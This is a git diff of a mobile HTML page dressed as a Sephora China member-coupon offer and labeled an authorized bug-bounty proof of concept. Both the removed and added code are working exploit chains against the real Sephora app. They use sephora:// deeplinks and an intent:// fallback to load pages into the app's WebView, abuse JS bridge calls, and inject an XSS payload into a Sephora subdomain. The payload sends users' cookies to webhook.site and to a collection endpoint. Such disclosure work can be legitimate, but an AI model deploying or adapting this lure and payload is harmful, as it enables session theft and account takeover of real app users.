@@ -6,21 +6,16 @@
 <title>丝芙兰·会员福利中心</title>
 <style>
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-body{font-family:-apple-system,'PingFang SC','Helvetica Neue',sans-serif;margin:0;background:linear-gradient(160deg,#1a1a1a 0%,#2d2d2d 50%,#1a1a1a 100%);color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center}
+body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:linear-gradient(160deg,#1a1a1a,#2d2d2d,#1a1a1a);color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center}
 .logo{font-size:52px;margin-bottom:6px}
-h1{font-size:26px;margin:0 0 6px;letter-spacing:2px;font-weight:700;color:#fff}
-.sub{color:#c9a96e;font-size:13px;letter-spacing:4px;text-transform:uppercase;margin-bottom:20px}
-.card{background:rgba(255,255,255,.06);border:1px solid rgba(201,169,110,.3);border-radius:16px;padding:24px 20px;width:100%;max-width:360px;margin:0 auto}
-.benefits{display:flex;gap:8px;margin:16px 0 24px;flex-wrap:wrap;justify-content:center}
-.b{background:rgba(201,169,110,.12);border:1px solid rgba(201,169,110,.25);border-radius:20px;padding:8px 16px;font-size:13px;color:#c9a96e}
-.btn{display:block;width:100%;max-width:320px;margin:12px auto;padding:16px;border:none;border-radius:28px;font-size:17px;font-weight:700;text-decoration:none;cursor:pointer;transition:transform .1s}
+h1{font-size:26px;margin:0 0 6px;letter-spacing:2px;color:#fff}
+.sub{color:#c9a96e;font-size:13px;letter-spacing:4px;margin-bottom:20px}
+.card{background:rgba(255,255,255,.06);border:1px solid rgba(201,169,110,.3);border-radius:16px;padding:24px 20px;width:100%;max-width:360px}
+.btn{display:block;width:100%;max-width:320px;margin:12px auto;padding:16px;border:none;border-radius:28px;font-size:17px;font-weight:700;text-decoration:none;cursor:pointer}
 .btn:active{transform:scale(.97)}
 .btn1{background:linear-gradient(135deg,#c9a96e,#b8905a);color:#1a1a1a}
-.btn2{background:rgba(255,255,255,.1);color:#c9a96e;border:1px solid rgba(201,169,110,.4)}
 .status{font-size:12px;color:rgba(255,255,255,.5);margin-top:16px;min-height:18px}
 .warn{font-size:11px;color:rgba(255,80,80,.6);margin-top:24px;line-height:1.6}
-#result{display:none;background:#1a0a0a;border:1px solid #ff4444;border-radius:12px;padding:16px;margin-top:20px;text-align:left;font-family:monospace;font-size:12px;color:#ff6666;white-space:pre-wrap;word-break:break-all;max-width:100%}
-#result h3{color:#ff4444;font-size:14px;margin:0 0 10px}
 </style>
 </head>
 <body>
@@ -29,103 +24,48 @@ h1{font-size:26px;margin:0 0 6px;letter-spacing:2px;font-weight:700;color:#fff}
 <div class="sub">会员专属福利 · 限时领取</div>
 
 <div class="card">
-  <div class="benefits">
-    <span class="b">✨ 新客礼遇</span>
-    <span class="b">🎁 满减券包</span>
-    <span class="b">💎 积分兑换</span>
-  </div>
   <p style="font-size:13px;color:rgba(255,255,255,.7);margin:0 0 8px;line-height:1.6">
     PINK 卡会员专享<br>点击下方按钮在丝芙兰 APP 中领取
   </p>
-
-  <button class="btn btn1" id="btn1" onclick="attack1()">
+  <button class="btn btn1" onclick="start()">
     🎁 领取新客优惠券
   </button>
-  <div style="font-size:11px;color:rgba(255,255,255,.4);margin:4px 0 16px">
-    演示: openurl 加载攻击页 → appHandler 偷数据
-  </div>
-
-  <button class="btn btn2" id="btn2" onclick="attack2()">
-    📋 查看我的订单
-  </button>
-  <div style="font-size:11px;color:rgba(255,255,255,.4);margin:4px 0 0">
-    演示: 先进官网 → callH5Js 注入 JS 偷 cookie
+  <div style="font-size:11px;color:rgba(255,255,255,.4);margin-top:4px">
+    演示: deeplink → App WebView → 子域XSS → Cookie 出网
   </div>
 </div>
 
 <div class="status" id="st">等待操作…</div>
-<div id="result"></div>
 
 <div class="warn">
   ⚠️ 授权安全测试演示页 (SRC PoC)<br>
-  点击后将拉起丝芙兰 APP 并演示 JSBridge 数据窃取<br>
+  点击后拉起丝芙兰 APP 并演示账号接管链<br>
   全程零 frida · 零工具 · 仅需正常点击
 </div>
 
 <script>
-// GitHub Pages 基础路径(自动推导)
-var BASE = 'https://derham1999.github.io/ai-daily';
-if (location.hostname === 'derham1999.github.io') {
-  BASE = location.origin + '/ai-daily';
-} else if (location.protocol === 'file:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1') {
-  BASE = location.origin + location.pathname.replace(/[^/]*$/, '');
-}
+// ★ 一键 PoC: XSS payload 读 cookie → 出网到 webhook.site
+var WEBHOOK = "32207bb0-fac3-4570-83b5-eb4e1db063f1";
 
-function st(s) {
-  document.getElementById('st').textContent = s;
-}
+function start() {
+  var st = document.getElementById('st');
+  st.textContent = "⚡ 正在拉起丝芙兰 APP…";
 
-// ═══ 攻击1: openurl 加载攻击页 → appHandler 偷数据 ═══
-function attack1() {
-  st('⚡ 正在拉起丝芙兰 APP…');
-  var stealUrl = BASE + '/sephora-steal.html';
-  var dl = 'sephora://openurl?url=' + encodeURIComponent(stealUrl);
-  // 尝试 scheme, 失败则 intent
+  var payload = "<img src=x onerror=\"new Image().src='https://" + WEBHOOK +
+    ".webhook.site/ato?c='+encodeURIComponent(location.origin+'|||'+document.cookie.substring(0,500))\">";
+  var xssUrl = "https://wx.sephora.cn/m/booking.html#/vicMsg?type=3&msg=" +
+    encodeURIComponent(payload);
+  var dl = "sephora://openurl?url=" + encodeURIComponent(xssUrl);
+
   location.href = dl;
   setTimeout(function() {
     if (!document.hidden) {
-      st('↗️ 尝试 intent:// 回退…');
-      location.href = 'intent://openurl?url=' + encodeURIComponent(stealUrl) +
-        '#Intent;scheme=sephora;package=com.arvato.sephora.app;end;';
+      st.textContent = "↗️ 尝试 intent:// 回退…";
+      location.href = "intent://openurl?url=" + encodeURIComponent(xssUrl) +
+        "#Intent;scheme=sephora;package=com.arvato.sephora.app;end;";
     }
   }, 1500);
-}
-
-// ═══ 攻击2: 先进官网 → 定时 callH5Js 注入偷 cookie ═══
-function attack2() {
-  st('⚡ 正在打开丝芙兰官网页面…');
-  // Step 1: 打开官网(让用户在 app WebView 中)
-  location.href = 'sephora://openurl?url=' + encodeURIComponent('https://m.sephora.cn/');
-
-  // Step 2: 5 秒后注入 JS(用户已在 sephora.cn 页面)
-  setTimeout(function() {
-    st('💉 正在注入 callH5Js…');
-    // 注入的 JS: 偷 cookie + 发到攻击者服务器 + 弹窗展示
-    var js = "var c=document.cookie;var u=navigator.userAgent;" +
-      "var d='cookie='+encodeURIComponent(c.substring(0,500))+'|ua='+encodeURIComponent(u.substring(0,200));" +
-      "new Image().src='" + BASE + "/collect.gif?'+d;" +
-      // 也在页面上展示(证明)
-      "var div=document.createElement('div');" +
-      "div.style.cssText='position:fixed;top:0;left:0;right:0;z-index:99999;background:#ff0000;color:#fff;padding:10px;font-size:12px;word-break:break-all';" +
-      "div.textContent='⚠️ JS注入成功! Cookie('+c.length+'字): '+c.substring(0,200);" +
-      "document.body.appendChild(div);";
-    location.href = 'sephora://foundation/callH5Js?method=' + encodeURIComponent(js);
-  }, 5000);
-
-  // 5秒倒计时显示
-  var n = 5;
-  var cd = setInterval(function() {
-    n--;
-    if (n > 0) { st('⏳ ' + n + '秒后注入 JS(请留在 APP 内)…'); return; }
-    clearInterval(cd);
-  }, 1000);
-}
-
-// 如果是在 APP WebView 中被加载(从攻击页跳回来)
-if (typeof window.appHandler !== 'undefined') {
-  st('⚠️ 检测到 appHandler 桥! 此页面在 APP WebView 中运行');
-  document.getElementById('result').style.display = 'block';
-  document.getElementById('result').innerHTML = '<h3>🚨 appHandler 可用!</h3>此页面已通过 deeplink 加载到丝芙兰 APP 内置浏览器中。<br><br>桥已注入, 可调用: getUserInfo(), appMonitorScript(), share() 等';
+  setTimeout(function(){ st.textContent = "✅ 请查看 webhook.site 收证页面"; }, 4000);
 }
 </script>
 </body>
